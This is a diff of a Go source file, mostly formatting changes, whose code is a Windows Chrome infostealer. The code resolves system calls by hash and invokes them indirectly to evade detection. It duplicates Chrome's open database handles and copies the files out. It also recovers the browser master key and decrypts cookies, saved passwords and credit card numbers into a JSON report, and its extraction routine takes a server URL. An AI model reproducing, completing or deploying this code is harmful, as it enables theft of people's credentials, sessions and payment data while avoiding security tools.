@@ -23,119 +23,119 @@ import (
 )
 
 type Cookie struct {
-	Profile	string	`json:"profile"`
-	Host	string	`json:"host"`
-	Name	string	`json:"name"`
-	Value	string	`json:"value"`
+	Profile string `json:"profile"`
+	Host    string `json:"host"`
+	Name    string `json:"name"`
+	Value   string `json:"value"`
 }
 
 type Password struct {
-	Profile		string	`json:"profile"`
-	URL		string	`json:"url"`
-	Username	string	`json:"username"`
-	Password	string	`json:"password"`
+	Profile  string `json:"profile"`
+	URL      string `json:"url"`
+	Username string `json:"username"`
+	Password string `json:"password"`
 }
 
 type Card struct {
-	Profile		string	`json:"profile"`
-	NameOnCard	string	`json:"name_on_card"`
-	Expiration	string	`json:"expiration"`
-	Number		string	`json:"number"`
+	Profile    string `json:"profile"`
+	NameOnCard string `json:"name_on_card"`
+	Expiration string `json:"expiration"`
+	Number     string `json:"number"`
 }
 
 type Output struct {
-	Timestamp	string		`json:"timestamp"`
-	MasterKey	string		`json:"master_key"`
-	Cookies		[]Cookie	`json:"cookies"`
-	Passwords	[]Password	`json:"passwords"`
-	Cards		[]Card		`json:"cards"`
+	Timestamp string     `json:"timestamp"`
+	MasterKey string     `json:"master_key"`
+	Cookies   []Cookie   `json:"cookies"`
+	Passwords []Password `json:"passwords"`
+	Cards     []Card     `json:"cards"`
 }
 
 var (
-	ntdllBase		= wc.GetModuleBase(wc.GetHash("ntdll.dll"))
-	queryProcess		= wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
-	querySystem		= wc.GetSyscall(wc.GetHash("NtQuerySystemInformation"))
-	queryObject		= wc.GetSyscall(wc.GetHash("NtQueryObject"))
-	closeHandleNt		= wc.GetSyscall(wc.GetHash("NtClose"))
-	ntReadFile		= wc.GetSyscall(wc.GetHash("NtReadFile"))
-	queryFileInfo		= wc.GetSyscall(wc.GetHash("NtQueryInformationFile"))
-	setFileInfo		= wc.GetSyscall(wc.GetHash("NtSetInformationFile"))
-	duplicateObject		= wc.GetSyscall(wc.GetHash("NtDuplicateObject"))
-	openProcess		= wc.GetSyscall(wc.GetHash("NtOpenProcess"))
-	createFile		= wc.GetSyscall(wc.GetHash("NtCreateFile"))
-	writeFile		= wc.GetSyscall(wc.GetHash("NtWriteFile"))
-	createThread		= wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
-	k32base			= wc.GetModuleBase(wc.GetHash("kernel32.dll"))
-	closeHandle		= wc.GetFunctionAddress(k32base, wc.GetHash("CloseHandle"))
-	createNamedPipeW	= wc.GetFunctionAddress(k32base, wc.GetHash("CreateNamedPipeW"))
-	connectNamedPipe	= wc.GetFunctionAddress(k32base, wc.GetHash("ConnectNamedPipe"))
-	ReadFile		= wc.GetFunctionAddress(k32base, wc.GetHash("ReadFile"))
+	ntdllBase        = wc.GetModuleBase(wc.GetHash("ntdll.dll"))
+	queryProcess     = wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
+	querySystem      = wc.GetSyscall(wc.GetHash("NtQuerySystemInformation"))
+	queryObject      = wc.GetSyscall(wc.GetHash("NtQueryObject"))
+	closeHandleNt    = wc.GetSyscall(wc.GetHash("NtClose"))
+	ntReadFile       = wc.GetSyscall(wc.GetHash("NtReadFile"))
+	queryFileInfo    = wc.GetSyscall(wc.GetHash("NtQueryInformationFile"))
+	setFileInfo      = wc.GetSyscall(wc.GetHash("NtSetInformationFile"))
+	duplicateObject  = wc.GetSyscall(wc.GetHash("NtDuplicateObject"))
+	openProcess      = wc.GetSyscall(wc.GetHash("NtOpenProcess"))
+	createFile       = wc.GetSyscall(wc.GetHash("NtCreateFile"))
+	writeFile        = wc.GetSyscall(wc.GetHash("NtWriteFile"))
+	createThread     = wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
+	k32base          = wc.GetModuleBase(wc.GetHash("kernel32.dll"))
+	closeHandle      = wc.GetFunctionAddress(k32base, wc.GetHash("CloseHandle"))
+	createNamedPipeW = wc.GetFunctionAddress(k32base, wc.GetHash("CreateNamedPipeW"))
+	connectNamedPipe = wc.GetFunctionAddress(k32base, wc.GetHash("ConnectNamedPipe"))
+	ReadFile         = wc.GetFunctionAddress(k32base, wc.GetHash("ReadFile"))
 )
 
 type Handle struct {
-	Val		uintptr
-	HandleCount	uintptr
-	PointerCount	uintptr
-	GrantedAccess	uint32
-	ObjectTypeIndex	uint32
-	HandleAttr	uint32
-	Reserved	uint32
+	Val             uintptr
+	HandleCount     uintptr
+	PointerCount    uintptr
+	GrantedAccess   uint32
+	ObjectTypeIndex uint32
+	HandleAttr      uint32
+	Reserved        uint32
 }
 
 type Snapshot struct {
-	Total	uintptr
-	_	uintptr
+	Total uintptr
+	_     uintptr
 }
 
 type ObjType struct {
-	Name	WideStr
-	Count	uint32
-	Total	uint32
+	Name  WideStr
+	Count uint32
+	Total uint32
 }
 
 type WideStr struct {
-	Size	uint16
-	MaxSz	uint16
-	Data	*uint16
+	Size  uint16
+	MaxSz uint16
+	Data  *uint16
 }
 
 type SystemProcessInfo struct {
-	NextEntryOffset	uint32
-	NumberOfThreads	uint32
-	Reserved1	[48]byte
-	ImageName	WideStr
-	BasePriority	int32
-	UniqueProcessId	uintptr
-	Reserved2	uintptr
-	HandleCount	uint32
-	SessionId	uint32
-	Reserved3	uintptr
-	PeakVirtualSize	uintptr
-	VirtualSize	uintptr
-	Reserved4	uint32
-	PeakWorkingSet	uintptr
-	WorkingSet	uintptr
-	Reserved5	uintptr
-	QuotaPagedPool	uintptr
-	Reserved6	uintptr
-	QuotaNonPaged	uintptr
-	PagefileUsage	uintptr
-	PeakPagefile	uintptr
-	PrivateUsage	uintptr
-	Reserved7	[6]uintptr
+	NextEntryOffset uint32
+	NumberOfThreads uint32
+	Reserved1       [48]byte
+	ImageName       WideStr
+	BasePriority    int32
+	UniqueProcessId uintptr
+	Reserved2       uintptr
+	HandleCount     uint32
+	SessionId       uint32
+	Reserved3       uintptr
+	PeakVirtualSize uintptr
+	VirtualSize     uintptr
+	Reserved4       uint32
+	PeakWorkingSet  uintptr
+	WorkingSet      uintptr
+	Reserved5       uintptr
+	QuotaPagedPool  uintptr
+	Reserved6       uintptr
+	QuotaNonPaged   uintptr
+	PagefileUsage   uintptr
+	PeakPagefile    uintptr
+	PrivateUsage    uintptr
+	Reserved7       [6]uintptr
 }
 
 type IoStatusBlock struct {
-	Status	uintptr
-	Info	uintptr
+	Status uintptr
+	Info   uintptr
 }
 
 type FileStandardInfo struct {
-	AllocationSize	int64
-	EndOfFile	int64
-	NumberOfLinks	uint32
-	DeletePending	byte
-	Directory	byte
+	AllocationSize int64
+	EndOfFile      int64
+	NumberOfLinks  uint32
+	DeletePending  byte
+	Directory      byte
 }
 
 type FilePositionInfo struct {
@@ -143,56 +143,60 @@ type FilePositionInfo struct {
 }
 
 type FileNameInfo struct {
-	FileNameLength	uint32
-	FileName	[1]uint16
+	FileNameLength uint32
+	FileName       [1]uint16
 }
 
 type ObjectAttributes struct {
-	Length				uint32
-	RootDirectory			uintptr
-	ObjectName			*WideStr
-	Attributes			uint32
-	SecurityDescriptor		uintptr
-	SecurityQualityOfService	uintptr
+	Length                   uint32
+	RootDirectory            uintptr
+	ObjectName               *WideStr
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
 }
 
 const (
-	pipeAccessDuplex	= 0x3
-	pipeTypeMessage		= 0x4
-	pipeReadmodeMessage	= 0x2
-	pipeWait		= 0x0
-	invalidHandleValue	= ^uintptr(0)
-	pipeName		= `\\.\pipe\chromepipe`
-	fileReadData		= 0x0001
-	fileWriteData		= 0x0002
-	fileAppendData		= 0x0004
-	fileReadEA		= 0x0008
-	fileWriteEA		= 0x0010
-	fileReadAttr		= 0x0080
-	fileWriteAttr		= 0x0100
-	readControl		= 0x20000
-	synchronize		= 0x100000
-	processVmOp		= 0x0008
-	processVmRead		= 0x0010
-	processVmWrite		= 0x0020
+	pipeAccessDuplex    = 0x3
+	pipeTypeMessage     = 0x4
+	pipeReadmodeMessage = 0x2
+	pipeWait            = 0x0
+	invalidHandleValue  = ^uintptr(0)
+)
 
-	statusMismatch	= 0xC0000004
-	statusSuccess	= 0x00000000
-	queryInfo	= 0x0400
-	dupHandle	= 0x0040
-	handleClass	= 51
-	typeClass	= 2
-	normalAttr	= 0x80
+var pipeName string = `\\.\pipe\chromepipe`
 
-	fileStandardInfo	= 5
-	filePositionInfo	= 14
-	fileNameInfo		= 9
+const (
+	fileReadData   = 0x0001
+	fileWriteData  = 0x0002
+	fileAppendData = 0x0004
+	fileReadEA     = 0x0008
+	fileWriteEA    = 0x0010
+	fileReadAttr   = 0x0080
+	fileWriteAttr  = 0x0100
+	readControl    = 0x20000
+	synchronize    = 0x100000
+	processVmOp    = 0x0008
+	processVmRead  = 0x0010
+	processVmWrite = 0x0020
+
+	statusMismatch = 0xC0000004
+	statusSuccess  = 0x00000000
+	queryInfo      = 0x0400
+	dupHandle      = 0x0040
+	handleClass    = 51
+	typeClass      = 2
+	normalAttr     = 0x80
+
+	fileStandardInfo = 5
+	filePositionInfo = 14
+	fileNameInfo     = 9
 )
 
 type securityAttributes struct {
-	nLength			uint32
-	lpSecurityDescriptor	uintptr
-	bInheritHandle		int32
+	nLength              uint32
+	lpSecurityDescriptor uintptr
+	bInheritHandle       int32
 }
 
 func createPipeServer() uintptr {
@@ -215,9 +219,9 @@ func createPipeServer() uintptr {
 	var sa *securityAttributes
 	if ret != 0 && pSD != 0 {
 		sa = &securityAttributes{
-			nLength:		uint32(unsafe.Sizeof(securityAttributes{})),
-			lpSecurityDescriptor:	pSD,
-			bInheritHandle:		0,
+			nLength:              uint32(unsafe.Sizeof(securityAttributes{})),
+			lpSecurityDescriptor: pSD,
+			bInheritHandle:       0,
 		}
 	}
 
@@ -252,18 +256,18 @@ func runExtraction(serverURL string) (*Output, error) {
 
 	var targetPID uint32
 	var foundHandles = make([]struct {
-		handle	uintptr
-		pid	uint32
-		path	string
-		dbType	string
+		handle uintptr
+		pid    uint32
+		path   string
+		dbType string
 	}, 0)
 
 	for pid, handles := range chromeProcs {
 		for _, h := range handles {
 			type extractResult struct {
-				data	[]byte
-				path	string
-				err	error
+				data []byte
+				path string
+				err  error
 			}
 			resultChan := make(chan extractResult, 1)
 
@@ -298,10 +302,10 @@ func runExtraction(serverURL string) (*Output, error) {
 
 			if dbType != "" {
 				foundHandles = append(foundHandles, struct {
-					handle	uintptr
-					pid	uint32
-					path	string
-					dbType	string
+					handle uintptr
+					pid    uint32
+					path   string
+					dbType string
 				}{h.Val, pid, path, dbType})
 				if targetPID == 0 {
 					targetPID = pid
@@ -315,9 +319,9 @@ func runExtraction(serverURL string) (*Output, error) {
 	}
 	tmpDir := os.TempDir()
 	tempFiles := make([]struct {
-		path	string
-		profile	string
-		dbType	string
+		path    string
+		profile string
+		dbType  string
 	}, 0)
 
 	for i, info := range foundHandles {
@@ -334,9 +338,9 @@ func runExtraction(serverURL string) (*Output, error) {
 
 		profile := extractProfileName(info.path)
 		tempFiles = append(tempFiles, struct {
-			path	string
-			profile	string
-			dbType	string
+			path    string
+			profile string
+			dbType  string
 		}{tmpPath, profile, info.dbType})
 	}
 
@@ -350,8 +354,8 @@ func runExtraction(serverURL string) (*Output, error) {
 	}
 
 	var clientId struct {
-		pid	uintptr
-		tid	uintptr
+		pid uintptr
+		tid uintptr
 	}
 	clientId.pid = uintptr(targetPID)
 
@@ -432,11 +436,11 @@ func runExtraction(serverURL string) (*Output, error) {
 	}
 
 	output := Output{
-		Timestamp:	time.Now().Format(time.RFC3339),
-		MasterKey:	fmt.Sprintf("%X", masterKey),
-		Cookies:	[]Cookie{},
-		Passwords:	[]Password{},
-		Cards:		[]Card{},
+		Timestamp: time.Now().Format(time.RFC3339),
+		MasterKey: fmt.Sprintf("%X", masterKey),
+		Cookies:   []Cookie{},
+		Passwords: []Password{},
+		Cards:     []Card{},
 	}
 
 	for _, fileInfo := range tempFiles {
@@ -541,10 +545,10 @@ func extractCookies(masterKey []byte, dbPath string, profile string) []Cookie {
 			}
 			value := base64.StdEncoding.EncodeToString(decrypted)
 			cookies = append(cookies, Cookie{
-				Profile:	profile,
-				Host:		host,
-				Name:		name,
-				Value:		value,
+				Profile: profile,
+				Host:    host,
+				Name:    name,
+				Value:   value,
 			})
 		}
 	}
@@ -588,10 +592,10 @@ func extractPasswords(masterKey []byte, dbPath string, profile string) []Passwor
 				decrypted = decrypted[32:]
 			}
 			passwords = append(passwords, Password{
-				Profile:	profile,
-				URL:		url,
-				Username:	username,
-				Password:	string(decrypted),
+				Profile:  profile,
+				URL:      url,
+				Username: username,
+				Password: string(decrypted),
 			})
 		}
 	}
@@ -636,10 +640,10 @@ func extractCards(masterKey []byte, dbPath string, profile string) []Card {
 				decrypted = decrypted[32:]
 			}
 			cards = append(cards, Card{
-				Profile:	profile,
-				NameOnCard:	nameOnCard,
-				Expiration:	fmt.Sprintf("%02d/%d", expMonth, expYear),
-				Number:		string(decrypted),
+				Profile:    profile,
+				NameOnCard: nameOnCard,
+				Expiration: fmt.Sprintf("%02d/%d", expMonth, expYear),
+				Number:     string(decrypted),
 			})
 		}
 	}
@@ -689,8 +693,8 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 					pid := uint32(info.UniqueProcessId)
 
 					var clientId struct {
-						pid	uintptr
-						tid	uintptr
+						pid uintptr
+						tid uintptr
 					}
 					clientId.pid = uintptr(pid)
 
@@ -760,8 +764,8 @@ func ScanProcesses(target string) (map[uint32][]Handle, error) {
 
 func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
 	var clientId struct {
-		pid	uintptr
-		tid	uintptr
+		pid uintptr
+		tid uintptr
 	}
 	clientId.pid = uintptr(owner)
 
@@ -955,8 +959,8 @@ func SaveFile(content []byte, dest string) error {
 
 func KillHandle(owner uint32, hnd uintptr) error {
 	var clientId struct {
-		pid	uintptr
-		tid	uintptr
+		pid uintptr
+		tid uintptr
 	}
 	clientId.pid = uintptr(owner)
 
@@ -1001,4 +1005,3 @@ func KillHandle(owner uint32, hnd uintptr) error {
 	wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(thd))
 	return nil
 }
-
